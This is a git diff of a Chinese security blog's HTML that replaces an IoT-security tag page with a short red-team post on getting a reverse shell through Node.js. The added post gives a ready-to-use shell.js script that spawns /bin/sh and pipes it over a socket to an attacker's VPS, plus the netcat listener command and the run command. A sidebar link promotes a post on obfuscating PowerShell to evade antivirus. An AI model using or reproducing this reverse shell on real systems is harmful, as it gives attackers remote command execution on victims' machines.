@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>物联网安全 | rebootORZ</title>
+<title>node.js反弹shell | rebootORZ</title>
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -32,6 +32,7 @@
 
   </head>
   <body>
+  
     <nav class="navbar border fixed split-nav">
   <div class="nav-brand">
     <h3><a href="https://rebootorz.github.io">rebootORZ</a></h3>
@@ -88,40 +89,61 @@
     <div id="top" class="row site">
       <div class="sm-12 md-8 col">
         <div class="paper">
-          <h2 class="current-tag">标签: 物联网安全</h2>
-          
-  <article class="article">
-    <h2 class="article-title">
-      <a href="https://rebootorz.github.io/WiFI-Pineapple-Evil-Portal/">WiFi Pineapple之Evil Portal</a>
-    </h2>
-    <p class="article-meta">
-      2021-01-09
-      
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
-          物联网安全
-        </a>
-      
-    </p>
-    <p class="text-lead">
-      
-    </p>
-    <div class="row">
-      <a href="https://rebootorz.github.io/WiFI-Pineapple-Evil-Portal/" class="readmore-link">
-        <button>
-          Read More
-        </button>
-      </a>
-    </div>
-  </article>
+          <article class="article">
+            <h1>node.js反弹shell</h1>
+            <p class="article-meta">
+              2021-01-15
+              
+                <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge ">
+                  红队
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <p>当环境中有node时，创建shell.js如下：</p>
+<pre><code>(function()){
+    var net = require(&quot;net&quot;),
+    cp = require(&quot;child_process&quot;),
+    sh = cp.spawn(&quot;/bin/sh&quot;,[]);
+    var client = new net.Socket();
+    client.connect(端口,&quot;VPS&quot;,function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);    
+    });
+    return /a/;
+})();
+</code></pre>
+<p>VPS监听：</p>
+<pre><code>nc -lvvp 端口
+</code></pre>
+<p>运行：</p>
+<pre><code>node shell.js
+</code></pre>
+<p>VPS获取到反弹的shell:<br>
+<img src="https://rebootorz.github.io/post-images/1610690975077.png" alt="" loading="lazy"></p>
 
-
+            </div>
+          </article>
         </div>
-        <div class="row flex-edges">
-  
-  
-</div>
-
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://rebootorz.github.io/HdxsJLVVU/">
+                <h3 class="post-title">
+                  Invoke-Obfuscation实现ps1脚本免杀
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
       </div>
+
       <div class="sm-12 md-4 col sidebar">
   <div class="paper info-container">
     <img src="https://rebootorz.github.io/images/avatar.png?v=1610691003975" class="no-responsive avatar">
@@ -196,11 +218,11 @@
     </div>
     <div class="row">
       
-        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge warning">
           红队
         </a>
       
-        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge success">
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge secondary">
           物联网安全
         </a>
       
@@ -210,6 +232,7 @@
     高度自律  绝对自由 | <a class="rss" href="https://rebootorz.github.io/atom.xml" target="_blank">RSS</a>
   </div>
 </div>
+
 
     </div>
 
